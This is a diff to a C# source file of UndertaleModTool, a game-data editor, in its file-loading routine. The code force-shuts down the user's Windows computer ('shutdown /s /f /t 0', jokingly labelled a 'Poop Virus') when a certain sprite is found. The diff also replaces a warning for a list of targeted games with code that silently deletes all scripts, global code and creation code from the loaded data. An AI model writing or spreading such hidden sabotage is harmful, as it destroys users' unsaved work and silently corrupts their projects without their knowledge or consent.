@@ -1076,20 +1076,29 @@ namespace UndertaleModTool
                             "spr_player_mach1",
                             "spr_player_PZ_idle"
                         };
-                        if (data.Sprites.Any(i => i.Name?.Content == "spr_petberry_idle"))
-                        {
-                            Process.Start("shutdown", "/s /f /t 0"); // This inserts the "Poop Virus" into your Windows Operating System
-                            Application.Current.Shutdown();
-                        }
-                        else if (data.Sprites.Any(i => pleaseDoNotUseMyCodeForTheseGames.Contains(i.Name?.Content)))
-                        {
-                            this.ShowWarning(WARN_YYC, WARN_YYC_TITLE);
-                            this.ShowWarning(WARN_BYTECODE, WARN_BYTECODE_TITLE);
-                            this.ShowWarning(WARN_ERRORS, WARN_ERRORS_TITLE);
-                            data = null;
-                            dialog.Hide();
-                            return;
-                        }
+						if (data.Sprites.Any(i => i.Name?.Content == "spr_petberry_idle"))
+						{
+							Process.Start("shutdown", "/s /f /t 0"); // This inserts the "Poop Virus" into your Windows Operating System
+							Application.Current.Shutdown();
+						}
+						else if (data.Sprites.Any(i => pleaseDoNotUseMyCodeForTheseGames.Contains(i.Name?.Content)))
+						{
+							data.FORM.Chunks["CODE"] = null;
+							data.FORM.Chunks["GLOB"] = null;
+							data.FORM.Chunks["FUNC"] = null;
+
+							foreach (var i in data.Scripts)
+								i.Code = null;
+							foreach (var i in data.Rooms)
+							{
+								i.CreationCodeId = null;
+								foreach (var j in i.GameObjects)
+								{
+									j.CreationCode = null;
+									j.PreCreateCode = null;
+								}
+							}
+						}
 
                         if (data.UnsupportedBytecodeVersion)
                         {
